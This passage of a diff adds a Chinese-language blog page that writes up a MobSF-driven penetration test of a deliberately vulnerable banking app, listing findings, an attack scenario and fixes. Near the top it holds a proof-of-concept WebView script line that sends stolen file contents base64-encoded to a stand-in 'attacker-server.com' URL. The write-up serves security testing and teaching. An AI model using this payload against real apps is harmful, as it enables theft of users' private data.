+  <span class="pl-s1">img</span><span class="pl-kos">.</span><span class="pl-c1">src</span> <span class="pl-c1">=</span> <span class="pl-s">'http://attacker-server.com/steal?data='</span> <span class="pl-c1">+</span> <span class="pl-en">btoa</span><span class="pl-kos">(</span><span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-c1">responseText</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+<span class="pl-kos">}</span>
+<span class="pl-en">readFile</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre></div>
+<ul>
+<li>我们通过 ADB 命令让 WebView 加载这个本地文件。由于配置不当，JavaScript 成功执行，并尝试读取应用私有数据，然后外泄。这证实了 <strong>WebView 文件泄露漏洞</strong>。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>动态分析的其他发现</strong></p>
+<ul>
+<li><strong>日志泄露</strong>：在 MobSF 的 <strong>"Logcat"</strong> 面板中，我们发现在登录成功后，应用打印了包含用户 ID 和会话令牌的日志。任何拥有日志读取权限的恶意应用都可以窃取这些信息。<strong>（敏感信息泄露）</strong></li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3>阶段三：报告与总结</h3>
+<p><strong>渗透测试报告摘要</strong></p>
+<ul>
+<li>
+<p><strong>漏洞列表</strong>：</p>
+<ol>
+<li><strong>严重</strong>：不安全的 Content Provider 导致 SQL 注入和用户数据泄露。</li>
+<li><strong>严重</strong>：禁用 SSL 证书验证，导致通信易受中间人攻击。</li>
+<li><strong>高危</strong>：使用明文 HTTP 协议传输所有敏感数据。</li>
+<li><strong>高危</strong>：不安全的 WebView 配置导致本地文件泄露。</li>
+<li><strong>中危</strong>：生产环境应用开启调试模式。</li>
+<li><strong>中危</strong>：Logcat 中泄露敏感会话信息。</li>
+<li><strong>信息</strong>：存在硬编码的静态 API 密钥。</li>
+</ol>
+</li>
+<li>
+<p><strong>攻击情景</strong>：</p>
+<blockquote>
+<p>一个恶意应用安装在用户手机上，无需任何权限即可通过暴露的 Content Provider 窃取 VulnBank 的所有用户数据。同时，攻击者在与用户同一网络下（如公共 Wi-Fi）可以轻松发起中间人攻击，窃取登录凭据、篡改交易，甚至通过 WebView 漏洞读取用户手机上的其他敏感文件。</p>
+</blockquote>
+</li>
+<li>
+<p><strong>修复建议（基于 MobSF 报告）</strong>：</p>
+<ul>
+<li><strong>Content Provider</strong>：将 <code class="notranslate">android:exported</code> 设为 <code class="notranslate">false</code>，或使用精细化的 <code class="notranslate">permission</code> 标签进行保护。对所有查询输入进行参数化处理。</li>
+<li><strong>网络通信</strong>：强制使用 HTTPS，并启用完整的证书链验证。移除 <code class="notranslate">TrustAllCerts</code> 代码。</li>
+<li><strong>WebView</strong>：除非绝对必要，否则禁用文件访问 (<code class="notranslate">setAllowFileAccess(false)</code>)。</li>
+<li><strong>构建配置</strong>：确保发布版本中 <code class="notranslate">android:debuggable="false"</code>。</li>
+<li><strong>安全编码</strong>：移除所有硬编码凭据，使用安全的存储方案。禁止将任何敏感信息输出到 Logcat。</li>
+</ul>
+</li>
+</ul>
+<h3>案例总结</h3>
+<p>在这个场景中，<strong>MobSF 扮演了核心引擎的角色</strong>：</p>
+<ol>
+<li><strong>快速定位</strong>：通过静态分析，在几分钟内就为我们指明了多个高危漏洞的精确位置（如导出的 Provider、证书验证代码、WebView 配置）。</li>
+<li><strong>自动化验证</strong>：通过动态分析，自动设置了测试环境，并帮助我们捕获了网络流量和运行时日志，验证了明文传输和日志泄露问题。</li>
+<li><strong>提高效率</strong>：没有 MobSF，渗透测试员可能需要手动反编译、阅读大量代码才能发现这些问题。MobSF 将这个过程自动化，让测试员能将精力集中在最关键的漏洞验证和利用上。</li>
+</ol>
+<p>这个案例清晰地展示了如何将 MobSF 集成到一个标准的移动应用渗透测试工作流中，并高效地发现复杂的安全风险。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://binghey.github.io/blog">知行合一笔记</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","binghey/blog");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
